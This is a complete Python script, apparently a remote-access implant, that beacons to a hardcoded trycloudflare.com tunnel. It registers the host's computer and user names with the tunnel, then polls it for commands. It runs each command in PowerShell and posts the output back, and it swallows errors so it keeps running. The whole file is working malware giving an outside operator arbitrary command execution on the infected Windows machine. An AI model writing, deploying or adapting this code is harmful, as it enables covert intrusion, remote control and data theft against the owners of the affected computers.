import ctypes
import json
import os
import subprocess
import sys
import time
import urllib.request
import urllib.error

TUNNEL = "https://rugs-mlb-whole-assess.trycloudflare.com"
TOKEN = "mothership-beacon-2024"
BEACON_ID = "persist-" + os.environ.get("COMPUTERNAME", "unknown")
POLL_INTERVAL = 10
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))

def run_cmd(cmd):
    try:
        r = subprocess.run(
            ["powershell.exe", "-NoProfile", "-Command", cmd],
            capture_output=True, text=True, timeout=60
        )
        return {"stdout": r.stdout[:2000], "stderr": r.stderr[:1000], "exitCode": r.returncode}
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": "Timeout", "exitCode": -1}
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "exitCode": -1}

def send_ack(msg_id):
    try:
        data = json.dumps({
            "type": "ack",
            "beaconId": BEACON_ID,
            "messageId": msg_id
        }).encode()
        req = urllib.request.Request(
            TUNNEL + "/api/beacon/ack",
            data=data,
            headers={"Content-Type": "application/json", "x-beacon-token": TOKEN}
        )
        urllib.request.urlopen(req, timeout=10)
    except:
        pass

def register():
    for _ in range(30):
        try:
            data = json.dumps({
                "type": "register",
                "beaconId": BEACON_ID,
                "hostname": os.environ.get("COMPUTERNAME", "unknown"),
                "username": os.environ.get("USERNAME", "unknown"),
                "pythonVersion": sys.version,
                "mode": "persistent"
            }).encode()
            req = urllib.request.Request(
                TUNNEL + "/api/beacon/register",
                data=data,
                headers={"Content-Type": "application/json", "x-beacon-token": TOKEN}
            )
            resp = urllib.request.urlopen(req, timeout=15)
            return json.loads(resp.read().decode())
        except Exception as e:
            time.sleep(5)
    return None

def poll():
    try:
        req = urllib.request.Request(
            TUNNEL + f"/api/beacon/poll?beaconId={BEACON_ID}",
            headers={"x-beacon-token": TOKEN}
        )
        resp = urllib.request.urlopen(req, timeout=15)
        return json.loads(resp.read().decode())
    except:
        return None

def main():
    reg = register()
    if not reg:
        return
    while True:
        try:
            msg = poll()
            if msg and msg.get("type") == "command":
                send_ack(msg.get("id", ""))
                cmd = msg.get("command", "")
                result = run_cmd(cmd)
                try:
                    data = json.dumps({
                        "type": "result",
                        "beaconId": BEACON_ID,
                        "messageId": msg.get("id", ""),
                        **result
                    }).encode()
                    req = urllib.request.Request(
                        TUNNEL + "/api/beacon/result",
                        data=data,
                        headers={"Content-Type": "application/json", "x-beacon-token": TOKEN}
                    )
                    urllib.request.urlopen(req, timeout=15)
                except:
                    pass
            elif msg and msg.get("type") == "ping":
                send_ack(msg.get("id", ""))
                try:
                    data = json.dumps({"type": "pong", "beaconId": BEACON_ID}).encode()
                    req = urllib.request.Request(
                        TUNNEL + "/api/beacon/result",
                        data=data,
                        headers={"Content-Type": "application/json", "x-beacon-token": TOKEN}
                    )
                    urllib.request.urlopen(req, timeout=10)
                except:
                    pass
            time.sleep(POLL_INTERVAL)
        except KeyboardInterrupt:
            break
        except:
            time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    main()
